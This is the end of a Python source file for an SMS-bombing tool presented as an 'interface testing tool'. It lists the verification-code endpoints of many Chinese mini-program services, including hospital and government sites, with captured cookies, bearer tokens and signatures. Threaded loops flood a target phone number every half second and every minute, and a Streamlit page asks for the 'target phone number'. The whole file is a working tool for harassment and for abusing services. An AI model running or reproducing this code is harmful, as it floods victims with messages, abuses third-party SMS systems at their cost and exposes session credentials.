"referer": "https://servicewechat.com/wxb25232612195a5a8/85/page-frame.html"
}
},
{
"name": "www.yixiangcun.com.cn",
"url": "https://www.yixiangcun.com.cn/lhjy/appUser/sendMsg",
"method": "GET",
"params": {
"phone": f"{phone}",
"loginType": "1"
},
"headers": {
"content-type": "application/json",
"charset": "utf-8",
"Referer": "https://servicewechat.com/wx351d4246e2948c96/12/page-frame.html"
}
},
{
"name": "xiaochiapi.xiaochihr.com",
"url": "https://xiaochiapi.xiaochihr.com/user/getSmsCode",
"method": "POST",
"json_data": {
"type": 1,
"mobile_pre": "+86",
"mobile": f"{phone}"
},
"headers": {
"content-type": "application/json;charset=UTF-8",
"nonce": "0.806839755019626",
"sign": "1fc991651e085471a10b86e68a2b8e1e",
"version": "H5_3.3.3",
"region": "zp",
"from": "xc_applet",
"channel": "",
"token": "",
"charset": "utf-8",
"referer": "https://servicewechat.com/wxeceacf00fe846a22/313/page-frame.html"
}
},
{
"name": "job.0635easy.com_2",
"url": "https://job.0635easy.com/api/Login/registerSendMsg",
"method": "POST",
"data": {
"mobile": f"{phone}",
"sessionId": "",
"appletType": "wx"
},
"headers": {
"charset": "utf-8",
"referer": "https://servicewechat.com/wxd8a6a3b9692141d4/208/page-frame.html",
"Cookie": "PHPSESSID=ae6e53a7ebf2e9467ea5325431195876"
}
},
{
"name": "hlwyy.chhospital.com.cn",
"url": "https://hlwyy.chhospital.com.cn/ChWeChatApi/hlwApi/hlwver/verifycode/sendverifycode",
"method": "POST",
"json_data": {
"VerifyType": "cardbinding",
"CardNo": "",
"PatTel": f"{phone}"
},
"headers": {
"Content-Type": "application/json",
"authorization": "Bearer 0e1pH1ll2ERJXg4xAcml2k9e8O0pH1lb",
"charset": "utf-8",
"referer": "https://servicewechat.com/wx6479bd4bf295961e/69/page-frame.html"
}
},
{
"name": "api.36bike.com",
"url": "https://api.36bike.com/user-api/v1/user/send/delsms",
"method": "POST",
"json_data": {
"area_code": "10000",
"area_id": "10000",
"user_id": "2511190515365001514",
"uid": "2511190515365001514",
"brand_code": "xzmcx",
"mobile": f"{phone}",
"randstr": "no_tencent_check"
},
"headers": {
"Accept": "application/json, text/plain, /",
"content-type": "application/json;charset=utf-8",
"authorization": "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3NzAyNTY4MzQsImp0aSI6IjI1MTExOTA1MTUzNjUwMDE1MTQiLCJpc3MiOiJRZXFuY2prUDhINm9WTnhrTFdWUmJQYVo3ZzlqVUVTNSJ9.smlMv0_CLJH30nswhWQdTp9Cf8YjUrAP_SvHeHyFfZo",
"charset": "utf-8",
"referer": "https://servicewechat.com/wx72282684d578de05/59/page-frame.html"
}
},
{
"name": "api.bailuyun.net",
"url": "https://api.bailuyun.net/oem/register/sendSms",
"method": "POST",
"json_data": {
"mobile": f"{phone}",
"admin_id": 275
},
"headers": {
"Content-Type": "application/json",
"charset": "utf-8",
"referer": "https://servicewechat.com/wx3547e33f7db825f3/19/page-frame.html"
}
},
{
"name": "cdmzt.cdszhmz.cn",
"url": "https://cdmzt.cdszhmz.cn:8808/cdmzt/app/appletLoginRestService/getAppCodeByPhone",
"method": "POST",
"data": {
"phoneNumber": f"{phone}"
},
"headers": {
"Host": "cdmzt.cdszhmz.cn:8808",
"charset": "utf-8",
"Referer": "https://servicewechat.com/wxa96fca3c80d64580/71/page-frame.html",
"Cookie": "JSESSIONID=6958C719446E2F935877AAD8FDAA1FEA"
}
},
{
"name": "jkb.sxjgsw.gov.cn",
"url": "https://jkb.sxjgsw.gov.cn:8084/Service/userinfo/smscode2",
"method": "POST",
"data": {
"emphone": f"{phone}"
},
"headers": {
"Host": "jkb.sxjgsw.gov.cn:8084",
"openid": "o78r74htrgPv_dhRV1yllcgKhjQM",
"officeZone": "",
"charset": "utf-8",
"Referer": "https://servicewechat.com/wxe58649eb4216c254/59/page-frame.html"
}
},
{
"name": "www.hzcgzf.cn_1",
"url": "https://www.hzcgzf.cn/api/auth/verificationCode/{phone}",
"method": "GET",
"headers": {
"content-type": "application/json",
"apiKey": "2N5D4KPOARIA5",
"signature": "da10136c599dac6f61c7617441820049",
"timestamp": "1767669475672",
"token": "",
"charset": "utf-8",
"Referer": "https://servicewechat.com/wx10c6f4397bbac12d/156/page-frame.html"
}
},
{
"name": "www.hzcgzf.cn_2",
"url": "https://www.hzcgzf.cn/api/register/verificationCode/{phone}",
"method": "GET",
"headers": {
"content-type": "application/json",
"apiKey": "2N5D4KPOARIA5",
"signature": "65bffa0723130e8b1b366244fad8b8f4",
"timestamp": "1767669633707",
"token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzUxMiJ9.eyJzdWIiOiIxOTg1NTY5NDEyNDI1NTg4NzM3IiwiaWF0IjoxNzY3NjY5NTQ4LCJleHAiOjE3NjgyNzQzNDh9.NnSy9-xP4GDtnYLtSISCXRI5tYlSibOTm9c5VPsPkaWwXSElThcfAfmqKtX5c362cza2XVPsa-JCodPW2Bh6HQ",
"charset": "utf-8",
"Referer": "https://servicewechat.com/wx10c6f4397bbac12d/156/page-frame.html"
}
},
]

def encrypt_phone(phone: str) -> str:
    """将手机号字符串进行 Base64 编码"""
    return base64.b64encode(phone.encode()).decode()

# ------------------ 核心请求函数（无阻塞，无结果） ------------------
def send_minute_request(config, mobile):
    """发送分钟循环接口请求 - 只发送，不关心结果，不影响后续"""
    try:
        # 如果是函数类型的配置（如AES加密接口）
        if 'func' in config:
            config['func'](*config.get('args', [mobile]))
            return

        # 替换手机号占位符
        url = config['url'].replace('{phone}', mobile)

        headers = {
            'User-Agent': random_user_agent(),
            **config.get('headers', {})
        }

        # 处理请求数据
        json_data = config.get('json_data')
        form_data = config.get('form_data')

        if config['method'].upper() == 'POST':
            if json_data:
                requests.post(
                    url,
                    json=json_data,
                    headers=headers,
                    timeout=1,
                    verify=False,
                    stream=False
                )
            elif form_data:
                requests.post(
                    url,
                    data=form_data,
                    headers=headers,
                    timeout=1,
                    verify=False,
                    stream=False
                )
            else:
                requests.post(
                    url,
                    headers=headers,
                    timeout=1,
                    verify=False,
                    stream=False
                )
        else:
            requests.get(
                url,
                headers=headers,
                timeout=1,
                verify=False,
                stream=False
            )
    except:
        pass  # 忽略所有异常，不影响下一个接口

def platform_request_worker(platform_func, mobile, *args, **kwargs):
    """平台请求工作线程 - 只发送，不关心结果"""
    try:
        platform_func(mobile)
    except:
        pass  # 忽略所有异常

# ------------------ 平台任务核心逻辑（全平台并发+固定间隔+无阻塞） ------------------
def platform_sequential_worker(mobile):
    """平台任务主控 - 每0.5秒并发请求所有平台一次，只发送不关心结果"""
    global exit_flag, platform_executor

    if not PLATFORMS:
        with print_lock:
            print("[平台任务] 无平台配置，跳过")
        return

    # 核心配置
    INTERVAL_CYCLE = 0.5  # 循环间隔：每0.5秒执行一次全平台请求
    # 线程池大小建议 >= 平台数量，确保所有平台可同时并发
    thread_pool_size = max(PLATFORM_THREAD_POOL_SIZE, len(PLATFORMS))

    # 初始化线程池（大小适配平台数量）
    platform_executor = ThreadPoolExecutor(
        max_workers=thread_pool_size,
        thread_name_prefix="PlatformWorker-"
    )

    total_platforms = len(PLATFORMS)
    cycle_count = 0

    with print_lock:
        print(f"[平台任务] 启动全平台并发模式，共 {total_platforms} 个平台")
        print(f"[平台任务] 执行节奏：每 {INTERVAL_CYCLE} 秒并发请求所有平台一次\n")

    while not exit_flag:
        cycle_start_time = time.time()
        cycle_count += 1

        # 一次性提交所有平台的任务到线程池 - 并发执行
        futures = []
        for platform_name, platform_func in PLATFORMS:
            if exit_flag:
                break
            # 提交单个平台的单次请求任务
            future = platform_executor.submit(platform_request_worker, platform_func, mobile)
            futures.append((platform_name, future))

        # 不等待任务执行完成，仅确保所有任务提交完毕
        for _ in futures:
            if exit_flag:
                break

        # 控制循环间隔：确保每 INTERVAL_CYCLE 秒执行一次全平台请求
        cycle_elapsed = time.time() - cycle_start_time
        if cycle_elapsed < INTERVAL_CYCLE and not exit_flag:
            time.sleep(INTERVAL_CYCLE - cycle_elapsed)

        # 可选：打印循环计数（如需静默执行可注释）
        with print_lock:
            print(f"[平台任务] 第 {cycle_count} 轮全平台请求已提交")

    # 关闭线程池
    platform_executor.shutdown(wait=False, cancel_futures=True)
    with print_lock:
        print("[平台任务] 线程池已关闭")



# ------------------ 分钟任务执行器（无阻塞，快速发送所有接口） ------------------
def execute_minute_tasks(configs, mobile):
    """执行所有分钟接口任务 - 只发送，不关心结果，快速完成"""
    global exit_flag

    if not configs:
        with print_lock:
            print("[分钟任务] 无接口配置，跳过本轮")
        return

    # 提交所有任务到线程池 - 不等待结果，直接提交
    futures = []
    for cfg in configs:
        if exit_flag:
            break
        future = minute_executor.submit(send_minute_request, cfg, mobile)
        futures.append(future)

    # 不等待任务执行完成，直接返回，确保1分钟内发完所有接口
    for future in futures:
        if exit_flag:
            break
        future  # 仅引用，不获取结果

# ------------------ 分钟循环主控 ------------------
def minute_worker(mobile):
    """分钟循环主控 - 每轮1分钟，发送所有接口，只发送不关心结果"""
    global exit_flag, minute_executor
    cycle_count = 0

    # 初始化分钟任务线程池（大线程池，快速发送）
    minute_executor = ThreadPoolExecutor(
        max_workers=MINUTE_TASK_MAX_THREADS,
        thread_name_prefix="MinuteTask-"
    )

    while not exit_flag:
        cycle_count += 1
        cycle_start_time = time.time()

        with print_lock:
            print(f"\n" + "="*50)
            print(f"第 {cycle_count} 轮分钟循环开始")
            print("="*50 + "\n")

        # 生成本轮接口配置
        configs = generate_requests_config(mobile)
        task_count = len(configs)

        with print_lock:
            print(f"[分钟任务] 开始发送 {task_count} 个接口...")

        # 执行本轮所有任务（无阻塞，快速提交）
        execute_minute_tasks(configs, mobile)

        with print_lock:
            print(f"[分钟任务] 所有 {task_count} 个接口已提交发送")

        # 计算本轮耗时
        cycle_elapsed = time.time() - cycle_start_time
        # 计算等待时间（确保总周期为60秒）
        wait_time = max(MINUTE_CYCLE_DURATION - cycle_elapsed, 0)

        with print_lock:
            print(f"\n[分钟循环] 本轮耗时 {cycle_elapsed:.2f} 秒")
            print(f"[分钟循环] 等待 {wait_time:.2f} 秒进入下一轮")
            print(f"="*50)
            print(f"第 {cycle_count} 轮分钟循环结束")
            print("="*50 + "\n")

        # 等待下一轮（支持中途退出）
        while wait_time > 0 and not exit_flag:
            sleep_time = min(wait_time, 0.1)
            time.sleep(sleep_time)
            wait_time -= sleep_time

    # 关闭分钟任务线程池
    minute_executor.shutdown(wait=False, cancel_futures=True)
    with print_lock:
        print("[分钟循环] 线程池已关闭")

# ------------------ 退出监听 ------------------
def listen_exit():
    """监听退出命令（输入任意键后回车退出）"""
    global exit_flag, platform_executor, minute_executor
    input()
    with print_lock:
        print("\n🛑 用户主动退出程序")
        print("🔄 正在关闭所有线程池...")
    exit_flag = True

    # 优雅关闭线程池（如果已初始化）
    if platform_executor:
        platform_executor.shutdown(wait=False, cancel_futures=True)
    if minute_executor:
        minute_executor.shutdown(wait=False, cancel_futures=True)

    with print_lock:
        print("✅ 所有线程池已关闭，程序即将退出")

# ------------------ 主函数 ------------------
# ... (上面是你的 PLATFORMS 列表，不要动) ...

# ------------------ 主函数 (Streamlit 网页版适配) ------------------
if __name__ == "__main__":
    # 设置网页标题和图标
    st.set_page_config(page_title="Python 接口测试工具", page_icon="🚀")

    st.title("🚀 Python 接口测试工具 (Web版)")
    st.markdown("---")

    # 1. 创建左侧侧边栏说明
    with st.sidebar:
        st.header("📖 使用说明")
        st.info("1. 在右侧输入手机号\n2. 点击【开始运行】\n3. 程序将在后台自动启动线程\n4. 请勿关闭此网页")
        st.warning("⚠️ 注意：详细的运行日志（print输出）不会显示在网页上，请点击右下角的 'Manage app' -> 'Logs' 查看黑色控制台。")

    # 2. 获取手机号 (网页输入框)
    mobile = st.text_input("请输入目标手机号:", max_chars=11, help="请输入11位中国大陆手机号")

    # 3. 运行按钮
    if st.button("🔥 开始运行", type="primary"):
        # 校验手机号
        if not mobile or len(mobile) != 11 or not mobile.isdigit():
            st.error("❌ 手机号格式错误！请输入11位数字")
        else:
            st.success(f"✅ 任务已启动！目标号码: {mobile}")
            st.info("🔄 程序正在后台运行中... 请观察右侧黑色控制台的日志输出。")
            
            # 初始化线程池（如果尚未初始化）
            # 注意：Streamlit 每次点击按钮都会重新运行脚本，所以这里直接启动线程即可
            # 使用 daemon=True 守护线程，防止网页关闭后线程僵死
            
            # 启动打印监听（虽然网页看不了print，但为了保持逻辑完整保留）
            if not any(t.name == "ExitThread" for t in threading.enumerate()):
                exit_thread = threading.Thread(target=listen_exit, daemon=True, name="ExitThread")
                exit_thread.start()

            # 启动平台任务线程
            threading.Thread(target=platform_sequential_worker, args=(mobile,), daemon=True).start()

            # 启动分钟循环主控线程
            threading.Thread(target=minute_worker, args=(mobile,), daemon=True).start()
